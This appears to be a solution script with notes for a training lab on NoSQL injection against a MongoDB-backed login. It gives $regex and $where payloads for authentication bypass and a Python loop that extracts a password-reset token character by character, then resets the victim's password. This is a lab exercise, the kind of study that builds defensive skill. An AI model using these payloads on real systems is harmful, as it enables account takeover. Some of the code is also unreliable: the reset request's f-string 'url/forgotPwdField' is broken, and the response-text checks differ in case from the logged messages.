'''
The user lookup functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.

To solve the lab, log in as carlos. 
'''

'''
Auth bypass without any running JS operator

POST /login
{"username":"carlos","password":"password123"}
- Response 200 - Invalid username or password

POST /login
{"username":"carlos","password":{"$regex":"^.*"}}
- Response 200 - Account Locked: please reset your password
- seems to indicate that authentication succeeded but account is lock so login isn't complete

----
Initial Auth bypass + executing JS

POST /login
{"username":"carlos","password":{"$regex":"^.*"},"$where":"0"}
- Response 200 - Invalid username or password

POST /login
{"username":"carlos","password":{"$regex":"^.*"},"$where":"1"}
- Response 200 - Account Locked: please reset your password
----
Create reset token

GET /forgot-password
- extract csrf token

POST /forgot-password
csrf=<CSRF Token>&username=carlos

----
Exfiltrate field names - we want to get the field name of the reset token of a user object
- use Initial Auth bypass + executing JS

1. Find length of user object field
- {"username":"carlos","password":{"$regex":"^.*"},"$where":"Object.keys(this)[i].match('^.{j}$')"}


2. Exfiltrate value of the targeted field name
- {"username":"carlos","password":{"$regex":"^.*"},"$where":"Object.keys(this)[i].match('^.a.*')"}
- another variant of regex(s) - '^.{0}a.*' 

'''

import string
import requests
from bs4 import BeautifulSoup

requests.packages.urllib3.disable_warnings() 

proxies = {
    'http': '127.0.0.1:8080',
    'https': '127.0.0.1:8080'
}

url = "https://0a9200cf037d510880b23a6300f8003c.web-security-academy.net"

s = requests.Session()
s.proxies.update(proxies)
s.verify = False

# Reset password for carlos
r = s.get(f"{url}/forgot-password")
soup = BeautifulSoup(r.text)
csrf = soup.find('input', {'name':'csrf'})['value']

payload = {
    'csrf':csrf,
    'username':'carlos'
}

s.post(f"{url}/forgot-password", data=payload)

# Exfiltrate field
char_set = string.ascii_lowercase + string.ascii_uppercase + string.digits

'''
for reference, user object only have 5 fields:
    [0] - _id
    [1] - username
    [2] - password
    [3] - email
    [4] - changePwd, resetPwdToken - varies
'''

resetToken = ''
forgotPwdField = {}

for i in range(4, 5): # save time - enumerate key[4]
    field = {
        'index':i,
        'name_len':0,
        'value_len':0,
        'name':'',
        'value':''
    }

    # exfiltrate field length
    for j in range(1, 50):
        payload = {
            'username':'carlos',
            'password':{'$regex':'^.*'},
            '$where':f"Object.keys(this)[{i}].match('^.{{{j}}}$')"
        }

        r = s.post(f"{url}/login", json=payload)
        if 'Account locked: please reset your password' in r.text:
            field['name_len'] = j
            print(f"[+] length of Object.keys(this)[{i}]: {j}")
            break

    # exfiltrate field name
    for j in range(0, field['name_len']):
        for char in char_set:
            payload = {
                'username':'carlos',
                'password':{'$regex':'^.*'},
                '$where':f"Object.keys(this)[{i}].match('^{field['name']+char}.*')"
            }

            r = s.post(f"{url}/login", json=payload)
            if 'Account locked: please reset your password' in r.text:
                field['name'] += char
                print(f"current exfiltrated name of Object.keys(this)[{i}]: {field['name']}")
                break

    print(f"[+] Object.keys(this)[{i}]: {field['name']}")

    # exfiltrate field value length
    for j in range(1, 50):
        payload = {
            'username':'carlos',
            'password':{'$regex':'^.*'},
            '$where':f"this.{field['name']}.length == {j}"
        }

        r = s.post(f"{url}/login", json=payload)
        if 'Account locked: please reset your password' in r.text:
            field['value_len'] = j
            print(f"[+] this.{field['name']}.length: {j}")
            break

    # exfiltrate field value
    for j in range(0, field['value_len']):
        for char in char_set:
            payload = {
                'username':'carlos',
                'password':{'$regex':'^.*'},
                '$where':f"this.{field['name']}.match('^{field['value']+char}')"
            }

            r = s.post(f"{url}/login", json=payload)
            if 'Account locked: please reset your password' in r.text:
                field['value'] += char
                print(f"current exfiltrated value of this.{field['name']}: {field['value']}")
                break
        
    print(f"[+] this.{field['name']}: {field['value']}")

    if i == 4:
        forgotPwdField = field
        print(f"[+] {field['name']}: {field['value']}")

# Reset password
params = {
    forgotPwdField['name']: forgotPwdField['value']
}
r = s.get(f"{url}/forgot-password", params=params)
soup = BeautifulSoup(r.text)
csrf = soup.find('input', {'name':'csrf'})['value']

payload = {
    'csrf':csrf,
    forgotPwdField['name']: forgotPwdField['value'],
    'new-password-1':'123456',
    'new-password-2':'123456'
}

r = s.post(f"{url/forgotPwdField}", params=params, data=payload)

# Login as carlos
payload = {
    'username':'carlos',
    'password':'123456'
}

r = s.post(f"{url}/login", json=payload)
